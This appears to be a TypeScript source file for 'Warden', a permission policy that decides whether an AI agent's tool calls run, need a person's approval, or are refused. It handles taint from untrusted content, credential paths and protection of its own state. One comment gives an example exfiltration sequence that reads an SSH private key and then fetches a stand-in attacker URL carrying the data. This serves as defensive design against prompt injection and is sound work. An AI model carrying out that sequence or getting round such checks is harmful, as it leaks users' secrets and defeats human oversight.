/**
 * The Warden policy: one pure function from an ActionRequest to a Decision.
 *
 * Order, first match wins:
 *   1. system invariants — not overridable by rules, grants or envelopes
 *   2. a user rule of "handoff"
 *   3. grants — narrowed by what the request is: a guarded command or an
 *      explicit "ask" rule accepts only the grant for this exact payload;
 *      sensitive or tainted egress accepts only payload- or target-bound
 *      grants; a tainted side effect accepts no tool-wide grant
 *   4. forced asks — things that ask whatever the matrix says (new recipient
 *      of sensitive data, tainted egress, credential paths, …)
 *   5. user rules, then the default matrix, then the context floor
 *
 * No I/O, no clock other than `ctx.now`, no model. Every path returns a
 * Decision; anything this function does not recognise resolves to "ask".
 */
import path from "node:path";
import { matchGrants, scopeProblem, type MatchOptions, type StoredGrant } from "./grants.js";
import { isInsideProtected } from "./paths.js";
import {
  DEFAULT_RULE_ORIGINS,
  LOCKED_CATEGORIES,
  matchRules,
  ownBehavior,
  strictness,
  type MatchedRule,
  type WardenRules,
} from "./rules.js";
import { GRANT_SCOPES, originColumn } from "./types.js";
import type {
  ActionCategory,
  ActionRequest,
  DataClass,
  Decision,
  GrantScope,
  OriginColumn,
  RuleBehavior,
  TaskEnvelope,
} from "./types.js";

export interface PolicyContext {
  rules: WardenRules;
  grants: StoredGrant[];
  /** The rules file existed but could not be trusted: nothing side-effecting is "auto". */
  rulesCorrupt?: boolean;
  /**
   * What the user CONFIRMED the task may do without asking. A host passes an
   * envelope here only once the user confirmed it (src/tasks/confirmation.ts);
   * a drafted one restricts the toolset and is never handed to the policy.
   */
  envelope?: TaskEnvelope;
  /** Absolute paths the model may never write — Warden's own state. */
  protectedPaths?: string[];
  now?: number;
}

export interface PolicyResult extends Decision {
  /** Grants the caller must record as used (and consume, for "once") before acting. */
  grantIds?: string[];
  /** For an "ask": the scopes the approver may choose from. */
  scopes?: GrantScope[];
  /** For an "ask": a "24h" approval is bound to the request's targets. */
  bindTargets?: boolean;
}

/** Categories with no effect outside Lisa's own home. "auto" by default. */
const BENIGN: ReadonlySet<ActionCategory> = new Set(["read", "self", "draft"]);
const SENSITIVE: ReadonlySet<DataClass> = new Set(["pii", "secret", "private-message"]);
/** Side effects a tool-wide grant must not cover once the run is tainted. */
const NO_BLANKET_WHEN_TAINTED: ReadonlySet<ActionCategory> = new Set([
  "exec",
  "network",
  "send",
  "publish",
  "delete",
]);

function isBenign(category: ActionCategory): boolean {
  return BENIGN.has(category);
}

/** Which column of the default matrix this request falls in. */
function columnOf(req: ActionRequest): OriginColumn {
  return originColumn(req.origin);
}

/** Sensitive data leaving the host: the request must be covered by a bound grant. */
function needsRecipientGrant(req: ActionRequest): boolean {
  const classes = req.dataClasses.filter((c) => SENSITIVE.has(c));
  if (classes.length === 0) return false;
  if (req.category === "send" || req.category === "publish" || req.category === "network") {
    return true;
  }
  // An off-host READ (a fetch) only trips on credentials in the request itself
  // — the exfiltration shape — not on an address someone asked to look up.
  return req.egress === true && isBenign(req.category) && classes.includes("secret");
}

/**
 * Tainted egress: in a run that has read untrusted content, an off-host
 * request to a destination the request itself names — a URL to fetch, a page
 * to ingest — is how data leaves (`read ~/.ssh/id_ed25519`, then
 * `web_fetch https://evil.example/?d=…`). It is let through only when the
 * exact URL already appeared in the conversation, so the model did not compose
 * it. A search query goes to the search provider, not to a host the page
 * picked, so "fixed" destinations are exempt.
 */
function isTaintedEgress(req: ActionRequest): boolean {
  return (
    req.tainted &&
    req.egress === true &&
    req.destination === "chosen" &&
    isBenign(req.category) &&
    req.destinationKnown !== true
  );
}

/**
 * The default matrix (docs/DESIGN_WARDEN.md). Returns the behaviour BEFORE user
 * rules, for the request's column and taint state.
 */
export function defaultBehavior(req: ActionRequest): RuleBehavior {
  const column = columnOf(req);
  const category = req.category;
  if (isBenign(category)) return "auto";
  if (category === "purchase" || category === "credential") return "handoff";
  if (category === "send" || category === "publish" || category === "delete") {
    return column === "task" ? "preapproved" : "ask";
  }
  if (category === "network") {
    if (column === "task") return "preapproved";
    return column === "chat" && !req.tainted ? "auto" : "ask";
  }
  if (category === "write" || category === "exec") {
    // Confined by the OS sandbox to the workspace: the blast radius is bounded.
    if (req.sandboxed) {
      if (column === "task") return "preapproved";
      return column === "chat" && !req.tainted ? "auto" : "ask";
    }
    // Not confined. An unsandboxed shell — or a file write with no sandbox
    // behind it — can do anything every other tool can, so letting it run
    // unasked would make every other "ask" advisory. It asks for every origin,
    // the local owner included; a user who wants the old behaviour says so
    // with a rule.
    return "ask";
  }
  return "ask";
}

/**
 * The strictest behaviour the context forces regardless of user rules: a
 * tainted run, a remote origin or an untrustworthy rules file never
 * auto-allows a side effect. A tainted TASK is floored at "preapproved" rather
 * than "ask" — tasks read the web as a matter of course — but in a tainted run
 * the envelope (which the user must have confirmed) still covers only reads
 * and writes inside the run's workspace: every other side effect asks
 * (`taintOverridesEnvelope`).
 */
function floorFor(req: ActionRequest, ctx: PolicyContext): MatchedRule {
  if (isBenign(req.category)) return { behavior: "auto", ruleId: "" };
  if (ctx.rulesCorrupt) return { behavior: "ask", ruleId: "system:rules-corrupt" };
  const column = columnOf(req);
  if (column === "channel") return { behavior: "ask", ruleId: "system:remote-origin" };
  if (req.tainted) {
    return { behavior: column === "task" ? "preapproved" : "ask", ruleId: "system:tainted-run" };
  }
  return { behavior: "auto", ruleId: "" };
}

/** Does the task envelope cover this request? Absent envelope covers nothing. */
export function envelopeCovers(req: ActionRequest, envelope: TaskEnvelope | undefined): boolean {
  if (!envelope) return false;
  const byTool = envelope.tools?.includes(req.tool) === true;
  const byCategory = envelope.categories?.includes(req.category) === true;
  if (!byTool && !byCategory) return false;
  const offHost =
    req.category === "network" || req.category === "send" || req.category === "publish";
  if (envelope.targets !== undefined) {
    if (req.targets.length === 0 || req.targetsComplete === false) return !offHost;
    return req.targets.every((target) => envelope.targets!.includes(target));
  }
  // No target list: fine for confined local work, but a tainted run may only
  // reach off-host targets the envelope named (simplified tainted egress).
  return !(offHost && req.tainted);
}

/**
 * In a tainted run, the side effects a confirmed envelope still does NOT
 * pre-approve: exec, delete, send, publish, a network write, and a write
 * outside the run's workspace. Reads, and writes inside the run's own
 * workspace, stay as the envelope says.
 */
export function taintOverridesEnvelope(req: ActionRequest): boolean {
  switch (req.category) {
    case "exec":
    case "delete":
    case "send":
    case "publish":
    case "network":
      return true;
    case "write":
      return req.withinWorkspace !== true;
    default:
      return false;
  }
}

function touchesProtected(req: ActionRequest, ctx: PolicyContext): boolean {
  if (!ctx.protectedPaths || ctx.protectedPaths.length === 0) return false;
  return req.targets.some(
    (target) =>
      path.isAbsolute(target) &&
      ctx.protectedPaths!.some((protectedPath) => isInsideProtected(protectedPath, target)),
  );
}

function systemInvariant(req: ActionRequest, ctx: PolicyContext): Decision | null {
  // The proactive channel is read-only: Lisa's self-driven runs may read and
  // write her own home, nothing else — not even a draft. Checked first so an
  // autonomous run never produces an inbox item either (POLICY_REACH_OUT).
  if (req.origin.kind === "autonomy" && req.category !== "read" && req.category !== "self") {
    return {
      verdict: "deny",
      reason:
        "Self-driven runs are read-only: this action has an external side effect and must " +
        "come from a task the user authorised.",
      ruleId: "system:autonomy-read-only",
    };
  }
  const locked = ownBehavior(LOCKED_CATEGORIES, req.category);
  if (locked === "handoff") {
    return {
      verdict: "handoff",
      reason:
        req.category === "purchase"
          ? "Purchases are never made on the user's behalf: hand this step back to the user."
          : "Credentials are never entered on the user's behalf: hand this step back to the user.",
      ruleId: `system:handoff-${req.category}`,
    };
  }
  if (req.surface === "cloud") {
    if (req.category === "exec") {
      return {
        verdict: "deny",
        reason: "Command execution is not available on the hosted edition.",
        ruleId: "system:cloud-no-exec",
      };
    }
    if ((req.category === "write" || req.category === "delete") && !req.connector) {
      return {
        verdict: "deny",
        reason: "Host file writes are not available on the hosted edition.",
        ruleId: "system:cloud-no-host-write",
      };
    }
  }
  if ((req.category === "write" || req.category === "delete") && touchesProtected(req, ctx)) {
    return {
      verdict: "deny",
      reason: "Warden's own rules, grants and audit files cannot be modified by a tool call.",
      ruleId: "system:warden-state-protected",
    };
  }
  return null;
}

function finalize(req: ActionRequest, result: PolicyResult): PolicyResult {
  // Belt and braces for the read-only proactive channel: nothing an autonomous
  // run does may wait on, or hand off to, a human.
  if (req.origin.kind === "autonomy" && result.verdict !== "allow" && result.verdict !== "deny") {
    return {
      verdict: "deny",
      reason: `Self-driven runs cannot ask for approval (${result.reason})`,
      ruleId: "system:autonomy-read-only",
    };
  }
  return result;
}

/**
 * Does a user rule apply to this request's origin? A rule that tightens (or
 * merely restates the default) applies everywhere. One that LOOSENS — `auto`,
 * or anything less strict than the default it would replace — applies only to
 * the origins its `origins` scope names, and by default only to the attended
 * chat: `tools.bash = auto` written for chat is not standing permission for
 * every unattended routine (#422 review M3). The remote-channel column never
 * matches a scope, and its floor would ask anyway.
 */
function ruleAppliesTo(rule: MatchedRule, req: ActionRequest, fallback: MatchedRule): boolean {
  const loosens =
    rule.behavior === "auto" || strictness(rule.behavior) < strictness(fallback.behavior);
  if (!loosens) return true;
  const column = columnOf(req);
  return (rule.origins ?? DEFAULT_RULE_ORIGINS).some((origin) => origin === column);
}

/**
 * The user's rule for the request, resolved against a fallback. A target rule
 * that covers every target is the most specific and wins outright; one that
 * covers only part of the targets can tighten but never loosen, and then the
 * stricter of the tool and category rules is the base.
 */
function resolveRule(
  rules: WardenRules,
  req: ActionRequest,
  fallback: MatchedRule,
): MatchedRule & { explicit: boolean } {
  const match = matchRules(rules, req, (rule) => ruleAppliesTo(rule, req, fallback));
  if (match.target && match.targetsCovered) return { ...match.target, explicit: true };
  const base = match.target ? match.strictBase : match.base;
  let chosen = base ?? fallback;
  let explicit = base !== undefined;
  if (match.target && strictness(match.target.behavior) > strictness(chosen.behavior)) {
    chosen = match.target;
    explicit = true;
  }
  return { ...chosen, explicit };
}

/** What makes this request ask regardless of the matrix, if anything. */
interface Forced {
  ruleId: string;
  reason: string;
  /** Scopes an approver may choose. */
  scopes: GrantScope[];
  /** Which grants may stand in for an approval. */
  grants: MatchOptions["mode"];
  bindTargets?: boolean;
}

function forcedAsk(req: ActionRequest, ctx: PolicyContext): Forced | null {
  if (req.guarded === true || (req.category === "exec" && touchesProtected(req, ctx))) {
    return {
      ruleId: "system:warden-state-guard",
      reason: "This command refers to Warden's own state files or approval API.",
      scopes: ["once"],
      grants: "once",
    };
  }
  if (needsRecipientGrant(req)) {
    return {
      ruleId: "system:new-recipient-sensitive-data",
      reason: "This sends personal or secret data to a recipient you have not approved before.",
      scopes: ["once", "target"],
      grants: "bound",
    };
  }
  if (isTaintedEgress(req)) {
    return {
      ruleId: "system:tainted-egress",
      reason:
        "This conversation has read untrusted content, and this request goes to an address " +
        "that did not appear in it — data could leave this way.",
      scopes: ["once", "target", "24h"],
      grants: "bound",
      bindTargets: true,
    };
  }
  if (
    req.sensitivePath === true &&
    (req.category === "read" || req.category === "write" || req.category === "delete")
  ) {
    return {
      ruleId: "system:credential-path",
      reason:
        req.category === "read"
          ? "This reads a location that holds credentials."
          : "This changes a location that holds credentials.",
      scopes: ["once", "target"],
      grants: "bound",
    };
  }
  if (req.category === "read" && req.tainted && touchesHostPath(req) && !req.withinWorkspace) {
    return {
      ruleId: "system:tainted-read-outside-workspace",
      reason:
        "This conversation has read untrusted content, and this reads a file outside the workspace.",
      scopes: ["once", "target"],
      grants: "bound",
    };
  }
  if (req.tainted && req.tool === "skill_manage" && req.category === "self") {
    return {
      ruleId: "system:tainted-skill-write",
      reason:
        "This conversation has read untrusted content, and a skill can change what Lisa does later.",
      scopes: ["once"],
      grants: "once",
    };
  }
  return null;
}

/** A read of a file on this machine (as opposed to a search or a fetch). */
function touchesHostPath(req: ActionRequest): boolean {
  return req.targets.length > 0 && req.targets.every((target) => path.isAbsolute(target));
}

/** The scopes an approver may choose for an ordinary (not forced) ask. */
function offeredScopes(req: ActionRequest, explicitAsk: boolean): GrantScope[] {
  if (explicitAsk) return ["once"];
  return GRANT_SCOPES.filter((scope) => {
    if (scopeProblem(req, scope) !== null) return false;
    // A standing grant on a shell, or one given while the run is tainted, is
    // how one click turns every later command into "auto".
    if ((scope === "always" || scope === "24h") && (req.category === "exec" || req.tainted)) {
      return false;
    }
    // What a command touches cannot be enumerated, so it has no target to bind.
    if (scope === "target" && req.category === "exec") return false;
    return true;
  });
}

function applicable(req: ActionRequest, scopes: GrantScope[]): GrantScope[] {
  return scopes.filter((scope) => scopeProblem(req, scope) === null);
}

/** Decide one action. Pure. */
export function evaluate(req: ActionRequest, ctx: PolicyContext): PolicyResult {
  const now = ctx.now ?? Date.now();

  const invariant = systemInvariant(req, ctx);
  if (invariant) return finalize(req, invariant);

  // The untainted default, so that when taint is what forces the ask, the
  // floor below — not a generic default — is recorded as the reason.
  const fallback: MatchedRule = {
    behavior: defaultBehavior({ ...req, tainted: false }),
    ruleId: `default:${req.category}`,
  };
  const user = resolveRule(ctx.rules, req, fallback);

  // A "handoff" rule is the user saying "never do this for me". No approval
  // could have been given under it, so no grant outranks it.
  if (user.explicit && user.behavior === "handoff") {
    return finalize(req, {
      verdict: "handoff",
      reason: "Your rules hand this kind of action back to you.",
      ruleId: user.ruleId,
    });
  }

  const forced = forcedAsk(req, ctx);
  // A user rule stricter than a grant wins, whichever is newer: under an
  // explicit "ask" only the approval of this exact payload counts.
  const explicitAsk = user.explicit && user.behavior === "ask";
  const mode: MatchOptions["mode"] =
    forced?.grants === "once" || explicitAsk ? "once" : (forced?.grants ?? "any");
  const granted = matchGrants(req, ctx.grants, now, {
    mode,
    // Tool-wide "always" / "24h" grants do not survive taint for side effects.
    noBlanket:
      req.tainted &&
      (NO_BLANKET_WHEN_TAINTED.has(req.category) ||
        (req.category === "write" && req.withinWorkspace !== true)),
  });
  if (granted) {
    return finalize(req, {
      verdict: "allow",
      reason: `Covered by a ${granted[0]!.scope} grant.`,
      grantId: granted[0]!.id,
      grantIds: granted.map((g) => g.id),
    });
  }

  if (forced) {
    // A user rule can stand in for a grant on the two egress checks: an
    // explicit "auto" that covers every target (or the tool) is the user
    // saying this destination is fine. It never unlocks a guarded command or
    // a credential path named only by a tool-wide rule.
    const ruleCovers =
      user.explicit &&
      user.behavior === "auto" &&
      forced.ruleId === "system:tainted-egress" &&
      !ctx.rulesCorrupt;
    if (!ruleCovers) {
      return finalize(req, {
        verdict: "ask",
        reason: forced.reason,
        ruleId: forced.ruleId,
        scopes: explicitAsk ? ["once"] : applicable(req, forced.scopes),
        bindTargets: forced.bindTargets,
      });
    }
  }

  let { behavior, ruleId } = user;
  const floor = floorFor(req, ctx);
  if (strictness(floor.behavior) > strictness(behavior)) {
    behavior = floor.behavior;
    ruleId = floor.ruleId;
  }

  const ask = (reason: string): PolicyResult =>
    finalize(req, { verdict: "ask", reason, ruleId, scopes: offeredScopes(req, explicitAsk) });

  switch (behavior) {
    case "auto":
      return finalize(req, { verdict: "allow", reason: "Allowed by policy.", ruleId });
    case "preapproved":
      if (envelopeCovers(req, ctx.envelope)) {
        // Taint overrides the envelope for side effects: what a page or a
        // mail asked for is not what the user confirmed.
        if (req.tainted && taintOverridesEnvelope(req)) {
          return finalize(req, {
            verdict: "ask",
            reason:
              "This run has read untrusted external content, so this action needs your " +
              "approval even though the task pre-approves it.",
            ruleId: "system:tainted-envelope",
            scopes: offeredScopes(req, explicitAsk),
          });
        }
        return finalize(req, {
          verdict: "allow",
          reason: "Pre-approved by the task's capability envelope.",
          ruleId: "envelope",
        });
      }
      return ask("This action was not pre-approved for the task.");
    case "handoff":
      return finalize(req, {
        verdict: "handoff",
        reason: "Your rules hand this kind of action back to you.",
        ruleId,
      });
    case "ask":
    default:
      return ask(askReason(req, ruleId));
  }
}

function askReason(req: ActionRequest, ruleId: string): string {
  if (ruleId === "system:tainted-run") {
    return "This run has read untrusted external content, so side effects need your approval.";
  }
  if (ruleId === "system:remote-origin") {
    return "This request came from a remote channel, so side effects need your approval.";
  }
  if (ruleId === "system:rules-corrupt") {
    return "Your Warden rules file could not be read, so side effects need your approval.";
  }
  if (req.category === "exec" && !req.sandboxed) {
    return "This runs a command with no sandbox around it.";
  }
  if (req.category === "write" && req.withinWorkspace !== true) {
    return "This writes outside the workspace.";
  }
  if (req.category === "write" && !req.sandboxed) {
    return "This writes a file with no sandbox around it.";
  }
  return `"${req.category}" actions need your approval.`;
}
